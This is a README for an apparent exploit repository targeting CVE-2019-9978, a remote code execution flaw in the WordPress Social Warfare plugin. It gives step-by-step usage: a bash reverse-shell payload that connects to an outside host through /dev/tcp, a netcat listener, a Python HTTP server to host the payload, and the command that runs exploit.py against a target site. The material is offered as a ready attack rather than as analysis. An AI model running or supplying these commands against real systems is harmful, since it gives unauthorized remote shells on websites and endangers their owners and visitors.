# CVE-2019-9978

This repository contains a Python script designed to exploit a Remote Code Execution (RCE) vulnerability in WordPress Plugin Social Warfare < 3.5.3. The vulnerability allows an attacker to execute arbitrary code on the target system by sending a crafted payload.

## Usage

**Create Payload**: First, a payload is created using a Bash reverse shell command. For example:

```bash
<pre>system("bash -c 'bash -i >& /dev/tcp/192.168.0.5/1234 0>&1'")</pre>
```
This payload establishes a reverse shell connection to the IP address `192.168.0.5` on port `1234`.

**Start Listening for Connections**: On the attacker's machine, the netcat (`nc`) command is used to listen for incoming connections on port `1234`. The command is:

```bash
nc -lvnp 1234
```

**Set Up an HTTP Server**: On the attacker's machine, an HTTP server is started using Python 3 to serve the payload file. The command to start the HTTP server is:

```bash
python3 -m http.server
```

To exploit the WordPress RCE vulnerability, run the script with the following command:


```bash
python3 exploit.py -t [TARGET_URL] -p [PAYLOAD_URL]
```


- -t, --target: Specify the target WordPress site URL.
- -p, --payload-url: Provide the URL where the payload is hosted. The script will send this payload to the target system.
